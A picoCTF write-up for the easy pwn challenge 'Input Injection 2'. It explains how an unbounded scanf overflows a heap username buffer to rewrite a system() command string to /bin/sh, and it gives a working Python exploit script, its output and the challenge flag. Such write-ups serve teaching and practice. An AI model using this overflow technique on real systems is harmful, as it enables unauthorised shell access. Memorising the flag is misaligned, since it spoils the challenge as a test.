---
title: "Input Injection 2"
ctf: "picoCTF"
date: 2026-08-05
category: pwn
difficulty: easy
points: N/A
flag_format: "picoCTF{...}"
author: "weiqi"
---

# Input Injection 2

## Summary

The program greets a username read with unbounded `scanf("%s", ...)` into a
28-byte heap buffer, then calls `system()` on a string stored in the adjacent
heap chunk. Overflowing the username buffer overwrites the command string
(`/bin/pwd` → `/bin/sh`), yielding a shell and the flag.

## Solution

### Step 1: Spot the overflow and the leaked offset

`vuln.c`:

```c
char* username = malloc(28);
char* shell    = malloc(28);
...
strcpy(shell, "/bin/pwd");
scanf("%s", username);        // unbounded -> heap overflow
system(shell);                // adjacent chunk -> attacker-controlled
```

The program helpfully prints both heap pointers (`username at %p`, `shell at
%p`). Their difference is the exact padding needed — **48 bytes (0x30) on the
remote**, not the 32 bytes naive glibc chunk math suggests. Compute it
dynamically instead of hardcoding.

### Step 2: Overflow and spawn a shell

`scanf("%s")` stops at whitespace, so the injected command cannot contain
spaces (`cat flag.txt` fails). Send `/bin/sh` as the overwritten command, then
run spaced commands through the resulting interactive shell.

```python
import re, socket, time

HOST, PORT = "amiable-citadel.picoctf.net", 52737

def rd(s):
    data = b""
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk: break
            data += chunk
    except (socket.timeout, ConnectionAbortedError, ConnectionResetError):
        pass
    return data

s = socket.create_connection((HOST, PORT), timeout=10)
s.settimeout(5)
banner = rd(s).decode(errors="replace")

user_ptr  = int(re.search(r"username at (0x[0-9a-f]+)", banner).group(1), 16)
shell_ptr = int(re.search(r"shell at (0x[0-9a-f]+)", banner).group(1), 16)
pad = shell_ptr - user_ptr                       # 48 on remote

s.sendall(b"A" * pad + b"/bin/sh\n")             # overwrite shell string
time.sleep(0.5); rd(s)
s.sendall(b"cat flag*\n")                        # spaced cmd via /bin/sh
time.sleep(1)
out = rd(s).decode(errors="replace")
print(out)
```

Output:

```
username at 0xd1652a0
shell at 0xd1652d0
Enter username:
picoCTF{us3rn4m3_2_sh3ll_48b038ff}
```

## Flag

```
picoCTF{us3rn4m3_2_sh3ll_48b038ff}
```
